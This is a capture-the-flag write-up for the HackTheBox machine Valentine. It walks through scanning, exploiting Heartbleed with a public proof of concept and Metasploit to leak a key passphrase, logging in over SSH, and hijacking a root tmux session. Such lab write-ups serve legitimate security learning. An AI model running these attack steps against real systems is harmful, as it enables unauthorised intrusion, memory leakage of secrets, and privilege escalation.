# HackTheBox — Valentine

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Cryptography / Heartbleed / tmux session hijack  
**Status:** Retired  

---

## Summary

Valentine exploits the famous **Heartbleed** vulnerability (CVE-2014-0160) in OpenSSL to leak a passphrase from server memory, then decodes a hex-encoded RSA key found via web enumeration. Privilege escalation hijacks an active root tmux session.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/valentine 10.10.10.79
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1
80/tcp  open  http     Apache httpd 2.4.7
443/tcp open  ssl/http Apache httpd 2.4.7
```

Check for Heartbleed:

```bash
nmap --script ssl-heartbleed -p 443 10.10.10.79
```

```
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in OpenSSL (CVE-2014-0160)
```

---

## Web Enumeration

The homepage image shows a bleeding heart (strong hint). Running gobuster:

```bash
gobuster dir -u https://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

```
/dev/
/encode
/decode
```

### /dev/ Directory

```
hype_key   (a hex-encoded file)
notes.txt
```

`notes.txt`:
```
To do:
1) Coffee.
2) Research.
3) Fix Heartbleed bug.
4) ???
5) Profit.
```

Download and decode `hype_key`:

```bash
wget https://10.10.10.79/dev/hype_key --no-check-certificate
cat hype_key | tr -d ' \n' | xxd -r -p
```

This outputs an **RSA private key** — but it's passphrase-protected.

---

## Exploitation — Heartbleed

Heartbleed allows reading arbitrary chunks of server memory by sending a crafted TLS heartbeat request with a mismatched payload length.

```bash
# Using the public PoC
python heartbleed.py 10.10.10.79 -p 443
```

Or use Metasploit:

```bash
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 10.10.10.79
set VERBOSE true
run
```

Run multiple times — the leaked memory changes each time. Look for readable strings. Eventually, a base64 string appears:

```
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Decode it:

```bash
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
# heartbleedbelievethehype
```

---

## SSH Access

Use the decoded RSA key with the passphrase:

```bash
chmod 600 hype_key
ssh -i hype_key hype@10.10.10.79
# Passphrase: heartbleedbelievethehype
```

Shell as **hype**.

---

## User Flag

```bash
cat /home/hype/user.txt
```

---

## Privilege Escalation — tmux Session Hijack

Check for running processes:

```bash
ps aux | grep root
```

```
root   1010  0.0  0.0  /usr/bin/tmux -S /.devs/dev_sess
```

Root is running a tmux session via a socket at `/.devs/dev_sess`.

Check permissions:

```bash
ls -la /.devs/dev_sess
# srw-rw---- 1 root hype 0 ... /.devs/dev_sess
```

`hype` group can access it — attach to the session:

```bash
tmux -S /.devs/dev_sess
```

**Root tmux session obtained!**

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Heartbleed** leaks arbitrary server memory — run it multiple times to catch sensitive data
- `/dev/` directories in web roots often contain staged sensitive files
- Hex-encoded files should always be decoded and examined
- tmux/screen sockets accessible by current user = session hijack = instant escalation
- Always run `ps aux | grep root` to find privileged processes and their open sockets

---

## CVE Reference

- **CVE-2014-0160** — OpenSSL Heartbleed Information Disclosure

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning + Heartbleed detection |
| gobuster | Web enumeration |
| heartbleed.py | Memory leak exploitation |
| xxd | Hex decoding |
| base64 | Passphrase decoding |
| tmux | Session hijacking |
